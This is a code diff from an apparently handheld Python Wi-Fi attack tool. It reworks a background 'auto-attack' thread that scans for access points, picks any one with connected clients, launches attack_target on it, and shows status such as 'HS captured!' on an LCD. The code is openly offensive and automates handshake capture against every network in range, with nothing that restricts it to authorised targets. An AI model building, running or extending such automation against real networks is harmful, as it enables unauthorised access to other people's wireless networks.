@@ -276,34 +276,47 @@ def attack_target(bssid, essid, channel):
 
 def auto_attack_worker():
     """Background thread for continuous auto-attack."""
+    global console_msg
     while auto_mode and not attack_stop.is_set():
-        # Scan for networks
-        scan_networks(10)
-        if not networks:
-            console_msg = "No APs found"
-            time.sleep(5)
-            continue
-        # Find an AP with clients
-        attacked = False
-        for net in networks:
-            if attack_stop.is_set():
-                break
-            bssid = net["bssid"]
-            essid = net["essid"]
-            channel = net["channel"]
-            clients = get_clients_for_ap(bssid, channel, timeout=5)
-            if clients:
-                console_msg = f"Auto: {essid[:12]}"
-                success = attack_target(bssid, essid, channel)
-                attacked = True
-                if success:
-                    time.sleep(10)
-                else:
-                    time.sleep(5)
-                break
-        if not attacked:
-            console_msg = "No clients, waiting"
-            time.sleep(5)
+        try:
+            # Scan for networks
+            console_msg = "Auto: scanning..."
+            scan_networks(10)
+            if not networks:
+                console_msg = "Auto: no APs"
+                time.sleep(5)
+                continue
+            
+            # Find any AP with clients
+            attacked_any = False
+            for net in networks:
+                if attack_stop.is_set():
+                    break
+                bssid = net["bssid"]
+                essid = net["essid"]
+                channel = net["channel"]
+                console_msg = f"Auto: checking {essid[:12]}"
+                clients = get_clients_for_ap(bssid, channel, timeout=5)
+                if clients:
+                    console_msg = f"Auto: attacking {essid[:12]}"
+                    success = attack_target(bssid, essid, channel)
+                    attacked_any = True
+                    if success:
+                        console_msg = "Auto: HS captured!"
+                        # After a successful capture, wait a bit before next attack
+                        time.sleep(8)
+                    else:
+                        console_msg = "Auto: attack failed"
+                        time.sleep(5)
+                    # After attacking one AP, break out of the for loop and rescan
+                    break
+            
+            if not attacked_any:
+                console_msg = "Auto: no clients"
+                time.sleep(5)
+        except Exception as e:
+            console_msg = f"Auto error: {str(e)[:15]}"
+            time.sleep(3)
 
 # ----------------------------------------------------------------------
 # LCD drawing and menu
